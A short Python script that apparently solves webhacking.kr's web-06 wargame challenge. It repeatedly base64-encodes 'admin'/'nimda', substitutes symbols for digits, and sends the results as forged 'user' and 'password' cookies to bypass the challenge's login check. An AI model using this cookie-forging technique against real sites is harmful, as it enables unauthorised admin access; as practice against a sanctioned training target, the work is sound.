import base64
import requests

val_id = 'admin'
val_pw = 'nimda'
val_id = val_id.encode('utf-8')
val_pw = val_pw.encode('utf-8')

for _ in range(0, 20):
    val_id = base64.b64encode(val_id)
    val_pw = base64.b64encode(val_pw)

val_id = val_id.decode('utf-8')
val_pw = val_pw.decode('utf-8')

val_id = val_id.replace('1', '!')
val_id = val_id.replace('2', '@')
val_id = val_id.replace('3', '$')
val_id = val_id.replace('4', '^')
val_id = val_id.replace('5', '&')
val_id = val_id.replace('6', '*')
val_id = val_id.replace('7', '(')
val_id = val_id.replace('8', ')')

val_pw = val_pw.replace('1', '!')
val_pw = val_pw.replace('2', '@')
val_pw = val_pw.replace('3', '$')
val_pw = val_pw.replace('4', '^')
val_pw = val_pw.replace('5', '&')
val_pw = val_pw.replace('6', '*')
val_pw = val_pw.replace('7', '(')
val_pw = val_pw.replace('8', ')')

url = 'https://webhacking.kr/challenge/web-06/'
cookies = {
    'user' : val_id,
    'password' : val_pw,
    'PHPSESSID' : 'your_phpsessid'
}
print(requests.post(url, cookies=cookies).text)